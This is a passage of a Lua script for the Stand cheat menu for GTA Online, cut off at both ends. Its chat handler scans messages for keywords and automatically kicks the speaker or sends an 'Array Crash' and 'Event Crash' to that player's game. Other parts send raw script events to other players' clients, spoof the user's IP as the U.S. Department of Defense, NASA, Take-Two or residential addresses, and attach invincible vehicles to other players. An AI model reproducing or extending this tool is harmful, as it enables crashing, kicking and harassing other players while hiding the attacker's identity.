                chatlist3,
                tostring(aj[U]),
                {},
                "ID - " .. tostring(U),
                function()
                end
            )
        end
    else
        menu.action(
            chatlist3,
            "Failed to find ChatJudge3.data",
            {},
            "Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge3.data",
            function(aM)
                notification("Failed to find Stand\\Lua Scripts\\data\\Chat Judge\\ChatJudge3.data", true, true)
            end
        )
    end
    chat.on_message(
        function(aN, aO, aP, aQ)
            if ak then
                pid = aN
                for U = 1, #aw do
                    if string.find(aP, aw[U], 1) then
                        if as and aN ~= players.user() then
                            if players.user() == players.get_host() then
                                notification(
                                    "Detected " ..
                                        aO ..
                                            " [PID " ..
                                                aN .. "] said [" .. tostring(aw[U]) .. "] in chat! Sending Host Kick",
                                    true,
                                    true
                                )
                                menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(aN))
                            else
                                notification(
                                    "Detected " ..
                                        aO ..
                                            " [PID " ..
                                                aN .. "] said [" .. tostring(aw[U]) .. "] in chat! Sending Kick V1 & V2",
                                    true,
                                    true
                                )
                                KickV1(aN, 2)
                                KickV2(aN, 2)
                            end
                        end
                        if ar and aN ~= players.user() then
                            notification(
                                "Detected " ..
                                    aO ..
                                        " [PID " ..
                                            aN ..
                                                "] said [" ..
                                                    tostring(aw[U]) .. "] in chat! Sending Array Crash V1 & Event Crash",
                                true,
                                true
                            )
                            EventArray(aN, 120, -1949011582)
                            Crash(aN)
                        end
                    end
                end
                if aG then
                    for U = 1, #ah do
                        if string.find(aP, ah[U], 1) then
                            if am and aN ~= players.user() then
                                if players.user() == players.get_host() then
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" .. tostring(ah[U]) .. "] in chat! Sending Host Kick",
                                        true,
                                        true
                                    )
                                    menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(aN))
                                else
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" ..
                                                            tostring(ah[U]) .. "] in chat! Sending Kick V1 & V2",
                                        true,
                                        true
                                    )
                                    KickV1(aN, 2)
                                    KickV2(aN, 2)
                                end
                            end
                            if al and aN ~= players.user() then
                                notification(
                                    "Detected " ..
                                        aO ..
                                            " [PID " ..
                                                aN ..
                                                    "] said [" ..
                                                        tostring(ah[U]) ..
                                                            "] in chat! Sending Array Crash V1 & Event Crash",
                                    true,
                                    true
                                )
                                EventArray(aN, 120, -1949011582)
                                Crash(aN)
                            end
                        end
                    end
                end
                if aH then
                    for U = 1, #ai do
                        if string.find(aP, ai[U], 1) then
                            if ao and aN ~= players.user() then
                                if players.user() == players.get_host() then
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" .. tostring(ai[U]) .. "] in chat! Sending Host Kick",
                                        true,
                                        true
                                    )
                                    menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(aN))
                                else
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" ..
                                                            tostring(ai[U]) .. "] in chat! Sending Kick V1 & V2",
                                        true,
                                        true
                                    )
                                    KickV1(aN, 2)
                                    KickV2(aN, 2)
                                end
                            end
                            if an and aN ~= players.user() then
                                notification(
                                    "Detected " ..
                                        aO ..
                                            " [PID " ..
                                                aN ..
                                                    "] said [" ..
                                                        tostring(ai[U]) ..
                                                            "] in chat! Sending Array Crash V1 & Event Crash",
                                    true,
                                    true
                                )
                                EventArray(aN, 120, -1949011582)
                                Crash(aN)
                            end
                        end
                    end
                end
                if aI then
                    for U = 1, #aj do
                        if string.find(aP, aj[U], 1) then
                            if kickdtc3 and aN ~= players.user() then
                                if players.user() == players.get_host() then
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" .. tostring(aj[U]) .. "] in chat! Sending Host Kick",
                                        true,
                                        true
                                    )
                                    menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(aN))
                                else
                                    notification(
                                        "Detected " ..
                                            aO ..
                                                " [PID " ..
                                                    aN ..
                                                        "] said [" ..
                                                            tostring(aj[U]) .. "] in chat! Sending Kick V1 & V2",
                                        true,
                                        true
                                    )
                                    KickV1(aN, 2)
                                    KickV2(aN, 2)
                                end
                            end
                            if ap and aN ~= players.user() then
                                notification(
                                    "Detected " ..
                                        aO ..
                                            " [PID " ..
                                                aN ..
                                                    "] said [" ..
                                                        tostring(aj[U]) ..
                                                            "] in chat! Sending Array Crash V1 & Event Crash",
                                    true,
                                    true
                                )
                                EventArray(aN, 120, -1949011582)
                                Crash(aN)
                            end
                        end
                    end
                end
            end
        end
    )
    faketype =
        menu.list(
        menu.my_root(),
        "fake chat",
        {},
        "",
        function()
        end
    )
    menu.action(
        faketype,
        "start",
        {},
        "Displays a typing indicator above your nickname and also makes other menus think you're typing and chatting",
        function(aM)
            menu.trigger_commands("hidetyping off")
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    send_script_event(-1329008922, pids, {players.user(), pids, 2131})
                end
            end
        end
    )
    menu.action(
        faketype,
        "stop",
        {},
        "",
        function(aM)
            for pids = 0, 32 do
                if players.exists(pids) and pids ~= players.user() then
                    send_script_event(1841943281, pids, {players.user(), pids, 2131})
                end
            end
            menu.trigger_commands("hidetyping on")
        end
    )
    spoofpresets =
        menu.list(
        menu.my_root(),
        "Ipcheater preset",
        {},
        "Stand's default GeoIP may show wrong location on some presets",
        function()
        end
    )
    menu.action(
        spoofpresets,
        "Enable IP spoofing",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofip on")
        end
    )
    menu.action(
        spoofpresets,
        "Disable IP Spoofers",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofip off")
        end
    )
    menu.divider(spoofpresets, "Fun IP Presets")
    menu.action(
        spoofpresets,
        "Computer Problem Solving (US)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "U.S. Department of Defense",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "NASA (U.S.)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Apple Inc. (US)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Akamai (Netherlands)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Microsoft (US)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Microsoft (Netherlands)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    t2spoofpresets =
        menu.list(
        spoofpresets,
        "Take-Two",
        {},
        "",
        function()
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (U.K.)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (U.S.)",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (Australia)",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
            elseif sel == 2 then
                menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
            end
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (Germany)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (Spain)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (Hungary)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (捷克)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (印度)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (SG)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (JP)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (CN)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        t2spoofpresets,
        "Take-Two (HK)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
        end
    )
    menu.divider(spoofpresets, "VPN IP Presets")
    octospoofpresets =
        menu.list(
        spoofpresets,
        "OVH",
        {},
        "",
        function()
        end
    )
    menu.action(
        octospoofpresets,
        "OVH (AU)",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        octospoofpresets,
        "OVH (DE)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
        end
    )
    menu.action(
        octospoofpresets,
        "OVH (UK)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
        end
    )
    menu.action(
        octospoofpresets,
        "OVH (US)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
        end
    )
    menu.action(
        octospoofpresets,
        "OVH (CA)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
        end
    )
    tempestpresets =
        menu.list(
        spoofpresets,
        "Tempest Hosting",
        {},
        "",
        function()
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (US-NY)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (US-CA)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (US-FL)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (CA)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (NL)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (UK)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (RU)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
        end
    )
    menu.action(
        tempestpresets,
        "Tempest Hosting (JP)",
        {},
        "",
        function(aM)
            menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
        end
    )
    menu.divider(spoofpresets, "Residential IP Presets")
    menu.action(
        spoofpresets,
        "Russia",
        {},
        "",
        function(aM)
            sel = math.random(1, 3)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 3 then
                menu.trigger_commands(
                    "spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 4 then
                menu.trigger_commands(
                    "spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "China",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Australia",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "USA Chicago",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "USA Baltimore",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "USA Texas",
        {},
        "AT&T / IBM",
        function(aM)
            menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
        end
    )
    menu.action(
        spoofpresets,
        "Germany",
        {},
        "",
        function(aM)
            sel = math.random(1, 4)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 3 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "93." ..
                            tostring(math.random(192, 255)) ..
                                "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 4 then
                menu.trigger_commands(
                    "spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Italy",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Netherlands",
        {},
        "",
        function(aM)
            sel = math.random(1, 4)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "217." ..
                            tostring(math.random(100, 105)) ..
                                "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 3 then
                menu.trigger_commands(
                    "spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 4 then
                menu.trigger_commands(
                    "spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "France",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "United Kingdom",
        {},
        "",
        function(aM)
            sel = math.random(1, 4)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 3 then
                menu.trigger_commands(
                    "spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 4 then
                menu.trigger_commands(
                    "spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Ireland",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Switzerland",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Austria",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Denmark",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Belgium",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Spain",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Portugal",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Norway",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Finland",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Sweden",
        {},
        "",
        function(aM)
            sel = math.random(1, 2)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Slovakia",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Romania",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Poland",
        {},
        "",
        function(aM)
            sel = math.random(1, 3)
            if sel == 1 then
                menu.trigger_commands(
                    "spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 2 then
                menu.trigger_commands(
                    "spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255))
                )
            elseif sel == 3 then
                menu.trigger_commands(
                    "spoofedip " ..
                        "217." ..
                            tostring(math.random(96, 99)) ..
                                "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255))
                )
            end
        end
    )
    menu.action(
        spoofpresets,
        "Czech Republic",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Bulgaria",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Slovenia",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Croatia",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Albania",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Lithuania",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Hungary",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    menu.action(
        spoofpresets,
        "Greece",
        {},
        "",
        function(aM)
            menu.trigger_commands(
                "spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255))
            )
        end
    )
    vehchaos =
        menu.list(
        menu.my_root(),
        "Vehicle Crazy",
        {},
        "",
        function()
        end
    )
    menu.toggle(
        vehchaos,
        "enable",
        {"vehchaos"},
        "",
        function(aR)
            if aR then
                aJ = true
            else
                aJ = false
            end
        end,
        false
    )
    menu.toggle(
        vehchaos,
        "gravity",
        {"vehchaosgrav"},
        "",
        function(aR)
            if aR then
                aK = true
            else
                aK = false
            end
        end,
        true
    )
    menu.click_slider(
        vehchaos,
        "strength",
        {"vehchaospower"},
        "",
        30,
        300,
        100,
        10,
        function(aS)
            aL = aS
        end
    )
end
function update_join(pid)
    cmd_id[pid] =
        menu.toggle(
        custselc,
        tostring(PLAYER.GET_PLAYER_NAME(pid)),
        {},
        "PID - " .. pid,
        function(ac)
            if ac then
                selectedplayer[pid] = true
            else
                selectedplayer[pid] = false
            end
        end
    )
end
function update_leave(pid)
    menu.delete(cmd_id[pid])
end
function delet_entity(M)
    entitypointer = memory.alloc(24)
    memory.write_int(entitypointer, M)
    bool = ENTITY.DELETE_ENTITY(entitypointer)
    memory.free(entitypointer)
    return bool
end
table_ladder = {attach}
table_entity = {attach}
table_gravity = {attach}
table_kidnap = {veh_to_attach}
veh_attach = {attach}
table_veh = {"adder", "buzzard", "cargobob", "dinghy", "banshee", "frogger", "zentorno"}
table_ped = {"a_c_boar", "a_c_deer", "a_c_chop", "a_c_chimp", "a_c_cow", "a_c_mtlion", "a_c_rabbit_01", "a_c_husky"}
function cleanup()
    for aT = 1, #table_ladder do
        delet_entity(table_ladder[aT])
    end
    for aT = 1, #veh_attach do
        delet_entity(veh_attach[aT])
    end
end
local aU = false
GenerateFeatures = function(pid)
    ladder = 1888301071
    ground = -1951226014
    attach = 1
    veh_to_attach = 1
    function v3_2(J, K, L)
        if J == nil then
            J = 0
        end
        if K == nil then
            K = 0
        end
        if L == nil then
            L = 0
        end
    end
    function attach_vehicle(aV, pid)
        local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local aW = util.joaat(aV)
        if STREAMING.IS_MODEL_A_VEHICLE(aW) then
            STREAMING.REQUEST_MODEL(aW)
            while not STREAMING.HAS_MODEL_LOADED(aW) do
                util.yield()
            end
            veh_attach[attach] =
                util.create_vehicle(aW, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(
                veh_attach[attach],
                V3,
                0,
                0,
                0,
                0,
                math.random(0, 180),
                0,
                math.random(0, 180),
                false,
                true,
                false,
                false,
                0,
                false
            )
            ENTITY.SET_ENTITY_VISIBLE(veh_attach[attach], true)
            ENTITY.SET_ENTITY_INVINCIBLE(veh_attach[attach], true)
            attach = attach + 1
            notification("Attached [" .. aV .. "] to " .. PLAYER.GET_PLAYER_NAME(pid), true, false)
        end
    end
    function spawn_ped(aX, pid)
        local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_hash = util.joaat(aX)
        STREAMING.REQUEST_MODEL(ped_hash)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            util.yield()
        end
        aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
        local Q = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z
        ENTITY.SET_ENTITY_COORDS(Q, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        ENTITY.SET_ENTITY_VISIBLE(Q, false)
        notification("Spawned [" .. aX .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), true, false)
    end
    function attach_vehicle_to_ped(aV, aX, pid, a1)
        local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local ped_hash = util.joaat(aX)
        STREAMING.REQUEST_MODEL(ped_hash)
        while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
            util.yield()
        end
        aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
        local Q = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
        coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-5, 5)
        coords_ped.y = coords_ped.y + math.random(-5, 5)
        coords_ped.z = coords_ped.z
        ENTITY.SET_ENTITY_COORDS(Q, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
        ENTITY.SET_ENTITY_VISIBLE(Q, true)
        for E = 1, a1 do
            for U = 1, #aV do
                local aW = util.joaat(aV[U])
                if STREAMING.IS_MODEL_A_VEHICLE(aW) then
                    STREAMING.REQUEST_MODEL(aW)
                    while not STREAMING.HAS_MODEL_LOADED(aW) do
                        util.yield()
                    end
                    veh_attach[attach] =
                        util.create_vehicle(aW, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
                    ENTITY.ATTACH_ENTITY_TO_ENTITY(
                        veh_attach[attach],
                        Q,
                        0,
                        0,
                        0,
                        0,
                        math.random(0, 180),
                        0,
                        math.random(0, 180),
                        false,
                        true,
                        false,
                        false,
                        0,
                        false
                    )
                    ENTITY.SET_ENTITY_VISIBLE(veh_attach[attach], true)
                    ENTITY.SET_ENTITY_INVINCIBLE(Q, true)
                    ENTITY.SET_ENTITY_INVINCIBLE(veh_attach[attach], true)
                    attach = attach + 1
                    notification(
                        "Spawned [" ..
                            aX ..
                                "] on [" ..
                                    coords_ped.x ..
                                        "] [" ..
                                            coords_ped.y .. "] [" .. coords_ped.z .. "] and attached [" .. aV[U] .. "]",
                        true,
                        false
                    )
                end
            end
        end
        util.yield(250)
        delet_entity(Q)
    end
    function attach_ladder(hash, aY, aZ, a_, b0, b1, b2, b3, pid)
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
